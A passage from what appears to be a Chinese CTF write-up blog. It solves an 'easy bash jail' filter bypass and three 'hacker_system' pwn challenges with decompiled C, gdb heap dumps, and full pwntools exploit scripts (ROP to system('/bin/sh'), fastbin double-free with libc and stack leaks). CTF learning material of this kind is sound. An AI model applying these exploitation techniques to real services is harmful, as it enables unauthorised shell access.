class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"===== easy bash jail ====="</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>, v3);</span><br><span class="line">    v3 = &amp;n;</span><br><span class="line">    getline(&amp;lineptr, &amp;n, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400706(lineptr) ) <span class="comment">//过滤了一些关键字母 abcfhgilnst*</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"hacker!! go away~~ QAQ"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      system(lineptr);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>方法一：考虑到system执行命令时<code>argv[0]</code>是sh(见源码),而<code>argv[0]</code>可以用<code>$0</code>这个变量来打印因此只要输入 <code>$0</code> 即可getshell.</p><p>方法二：可以用 <code>???/??? ????</code> ,<code>?</code>可以做通配符，根据提示<code>???/???</code>可以匹配到<code>/bin/cat</code></p><h3 id="hacker-system-ver1"><a href="#hacker-system-ver1" class="headerlink" title="hacker_system_ver1"></a>hacker_system_ver1</h3><p>程序提供了add，print和delete的功能<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  sub_80489BB();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to hacker system ver1.0\n\n"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">      v0 = read_int();</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      print_hacker();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        del_hacker();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"bye."</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"invaild command."</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      <span class="keyword">if</span> ( add_hacker() == <span class="number">-1</span> )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"add failed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>print和delete都有简单的栈溢出可利用<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048A20</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [esp+4h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"searched by name, input name length:"</span>);</span><br><span class="line">  v2 = read_int();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input hacker's name:"</span>);</span><br><span class="line">  result = read_str((<span class="keyword">int</span>)&amp;s1, v2);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = hacker_list[i];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="built_in">strcmp</span>(&amp;s1, (<span class="keyword">const</span> <span class="keyword">char</span> *)(hacker_list[i] + <span class="number">4</span>));</span><br><span class="line">      <span class="keyword">if</span> ( !result )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">        result = <span class="built_in">printf</span>(</span><br><span class="line">                   <span class="string">"id:%u, name:%s, age:%u, intro:%s\n"</span>,</span><br><span class="line">                   *(_DWORD *)hacker_list[i],</span><br><span class="line">                   hacker_list[i] + <span class="number">4</span>,</span><br><span class="line">                   *(_DWORD *)(hacker_list[i] + <span class="number">36</span>),</span><br><span class="line">                   *(_DWORD *)(hacker_list[i] + <span class="number">40</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"not find!!"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.230.149.72'</span> , <span class="number">10005</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hacker_system_ver1'</span> )</span><br><span class="line">libc = ELF(<span class="string">'./libc32.so'</span> )</span><br><span class="line"></span><br><span class="line">print_hacker_addr = <span class="number">0x8048a20</span></span><br><span class="line">junk = <span class="string">'a'</span>*<span class="number">0x38</span></span><br><span class="line">payload = junk + p32(elf.symbols[<span class="string">'puts'</span>]) + p32(print_hacker_addr) + p32(elf.got[<span class="string">'printf'</span>])</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,<span class="string">'123'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">success(hex(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line"></span><br><span class="line">payload = junk + p32(system) + p32(<span class="number">0</span>) + p32(binsh)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,<span class="string">'123'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="hacker-system-ver2"><a href="#hacker-system-ver2" class="headerlink" title="hacker_system_ver2"></a>hacker_system_ver2</h3><p>同ver1，只是变成64位<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.230.149.72'</span> , <span class="number">10008</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hacker_system_ver2'</span> )</span><br><span class="line">libc = ELF(<span class="string">'./libc64.so'</span> )</span><br><span class="line"></span><br><span class="line">pr = <span class="number">0x400fb3</span></span><br><span class="line">print_hacker_addr = <span class="number">0x400c63</span></span><br><span class="line">junk = <span class="string">'a'</span>*<span class="number">0x38</span></span><br><span class="line">payload = junk + p64(pr) + p64(elf.got[<span class="string">'read'</span>]) + p64(elf.plt[<span class="string">'puts'</span>]) + p64(print_hacker_addr)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,<span class="string">'123'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00'</span>*<span class="number">2</span>) - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">success(hex(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line"></span><br><span class="line">payload = junk + p64(pr) + p64(binsh) + p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,<span class="string">'123'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="hacker-system-ver3"><a href="#hacker-system-ver3" class="headerlink" title="hacker_system_ver3"></a>hacker_system_ver3</h3><p>hacker资料结构体：（共0x38 byte）</p><table><thead><tr><th>内容</th><th>大小</th></tr></thead><tbody><tr><td>age</td><td>8 byte</td></tr><tr><td>name</td><td>32 byte</td></tr><tr><td>id</td><td>8 byte</td></tr><tr><td>intro addr</td><td>8 byte</td></tr></tbody></table><p>漏洞点很明显，在del那里，会删除同名的所有hacker资料，但是只情空了最后一个指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">del_hacker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **ptr; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input hacker's name:"</span>);</span><br><span class="line">  read_str(&amp;s1, <span class="number">32L</span>L);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( list_table[i] &amp;&amp; !<span class="built_in">strcmp</span>(&amp;s1, (<span class="keyword">const</span> <span class="keyword">char</span> *)(list_table[i] + <span class="number">8</span>)) )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">      v2 = i;</span><br><span class="line">      ptr = (<span class="keyword">void</span> **)list_table[i];</span><br><span class="line">      <span class="built_in">free</span>(ptr[<span class="number">6</span>]);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    list_table[v2] = <span class="number">0L</span>L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"delete hacker %s done!!\n"</span>, &amp;s1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"not find!!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，先把libc基址和stack地址泄露出来。利用步骤是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'aaa'</span>,<span class="number">111</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="string">'aaa'</span>,<span class="number">111</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="string">'aaa'</span>)</span><br></pre></td></tr></table></figure><p>先新建两个，intro大小为0x20，然后看一下heap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heap all</span><br><span class="line">Top Chunk:  0x1c8e2a0</span><br><span class="line">Last Remainder:  0x0</span><br><span class="line">0x1c8e000</span><br><span class="line">0x1c8e000 SIZE=0x40 DATA[0x1c8e010] |(.......vvv_347.................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e040 SIZE=0x30 DATA[0x1c8e050] |have a good command of re.......| INUSED PREV_INUSE</span><br><span class="line">0x1c8e070 SIZE=0x40 DATA[0x1c8e080] |........hammer..................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e0b0 SIZE=0x30 DATA[0x1c8e0c0] |have a good command of web......| INUSED PREV_INUSE</span><br><span class="line">0x1c8e0e0 SIZE=0x40 DATA[0x1c8e0f0] |................................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e120 SIZE=0x30 DATA[0x1c8e130] |have a good command of web and c| INUSED PREV_INUSE</span><br><span class="line">0x1c8e150 SIZE=0x40 DATA[0x1c8e160] |........veritas501..............| INUSED PREV_INUSE</span><br><span class="line">0x1c8e190 SIZE=0x30 DATA[0x1c8e1a0] |...............................j| INUSED PREV_INUSE</span><br><span class="line">0x1c8e1c0 SIZE=0x40 DATA[0x1c8e1d0] |o.......aaa.....................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e200 SIZE=0x30 DATA[0x1c8e210] |aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">0x1c8e230 SIZE=0x40 DATA[0x1c8e240] |o.......aaa.....................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e270 SIZE=0x30 DATA[0x1c8e280] |aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">0x1c8e2a0 SIZE=0x20d60 TOP_CHUNK</span><br></pre></td></tr></table></figure></p><p>然后把aaa删掉，那么现在有两个0x40的fastbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heap freed</span><br><span class="line">FASTBINS:</span><br><span class="line">Fastbin1 : </span><br><span class="line">0x1c8e270 SIZE=0x30 DATA[0x1c8e280] |........aaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">0x1c8e200 SIZE=0x30 DATA[0x1c8e210] |........aaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">Fastbin2 : </span><br><span class="line">0x1c8e230 SIZE=0x40 DATA[0x1c8e240] |........aaa.....................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e1c0 SIZE=0x40 DATA[0x1c8e1d0] |........aaa.....................| INUSED PREV_INUSE</span><br></pre></td></tr></table></figure></p><p>现在，可以新建一个bbb，intro大小为0x38，就是跟结构体的大小一致，目的是伪造一个结构体。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">222</span>)+<span class="string">'puts'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">222</span>)+p64(elf.got[<span class="string">'puts'</span>]) <span class="comment"># len = 0x38</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">add(<span class="string">'bbb'</span>,<span class="number">222</span>,payload)</span><br><span class="line">show(<span class="string">'puts'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts addr :'</span>,hex(puts_addr)</span><br></pre></td></tr></table></figure></p><p>可以看到，之前freed的两个0x40大小fastbin被利用了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xc6e1c0 SIZE=0x40 DATA[0xc6e1d0] |........puts....................| INUSED PREV_INUSE</span><br><span class="line">0xc6e200 SIZE=0x30 DATA[0xc6e210] |........aaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">0xc6e230 SIZE=0x40 DATA[0xc6e240] |........bbb.....................| INUSED PREV_INUSE</span><br><span class="line">0xc6e270 SIZE=0x30 DATA[0xc6e280] |........aaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br></pre></td></tr></table></figure></p><p>看看hack_list的内容，第5个指针是指向我们伪造的puts，此时show puts的资料，就能把puts函数的地址泄露出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x6020c0</span><br><span class="line">0x6020c0: 0x0000000000c6e010  0x0000000000c6e080</span><br><span class="line">0x6020d0: 0x0000000000c6e0f0  0x0000000000c6e160</span><br><span class="line">0x6020e0: 0x0000000000c6e1d0  0x0000000000c6e240</span><br></pre></td></tr></table></figure></p><p>stack地址泄露参考：<a href="https://github.com/Naetw/CTF-pwn-tips#leak-stack-address" target="_blank" rel="noopener">https://github.com/Naetw/CTF-pwn-tips#leak-stack-address</a> ，通过<code>environ</code>来leak，stack偏移可以本地调试计算。</p><p>由于开了canary，通过fastbin任意地址写的时候选择没有canary保护的函数，例如用了读取字符串的read_Str，通过修改ret来getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,age,intro)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line">  p.sendlineafter(<span class="string">'age:'</span>,str(age))</span><br><span class="line">  p.sendlineafter(<span class="string">':'</span>,str(len(intro)))</span><br><span class="line">  p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">  p.send(intro)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(name)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(name)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'name:'</span>,name) </span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc_base</span></span><br><span class="line">add(<span class="string">'aaa'</span>,<span class="number">111</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="string">'aaa'</span>,<span class="number">111</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="string">'aaa'</span>)</span><br><span class="line">payload = p64(<span class="number">222</span>)+<span class="string">'puts'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">222</span>)+p64(elf.got[<span class="string">'puts'</span>]) <span class="comment"># len = 0x38</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">add(<span class="string">'bbb'</span>,<span class="number">222</span>,payload)</span><br><span class="line">show(<span class="string">'puts'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts addr :'</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]system addr :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">add(<span class="string">'ccc'</span>,<span class="number">333</span>,<span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="string">'ccc'</span>,<span class="number">333</span>,<span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="string">'ccc'</span>)</span><br><span class="line"><span class="comment">#payload = p64(444)+'environ'.ljust(0x20,'\0')+p64(444)+p64(libc.address+0x3c92f8) # libc_argv</span></span><br><span class="line">payload = p64(<span class="number">444</span>)+<span class="string">'environ'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">444</span>)+p64(libc.symbols[<span class="string">'environ'</span>]) <span class="comment"># libc_env</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">add(<span class="string">'ddd'</span>,<span class="number">444</span>,payload)</span><br><span class="line">show(<span class="string">'environ'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">environ_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]environ addr :'</span>,hex(environ_addr)</span><br><span class="line">stack_off = <span class="number">0xf8</span></span><br><span class="line">stack_addr = environ_addr<span class="comment">#-0xf8</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]stack addr :'</span>,hex(stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin dup</span></span><br><span class="line">pr = <span class="number">0x401053</span> <span class="comment"># pop rdi , ret</span></span><br><span class="line">add(<span class="string">'A'</span>,<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="string">'A'</span>,<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">'B'</span>,<span class="number">2</span>,<span class="string">'B'</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'A'</span>)  <span class="comment"># A</span></span><br><span class="line">add(<span class="string">'C'</span>,<span class="number">3</span>,<span class="string">'C'</span>*<span 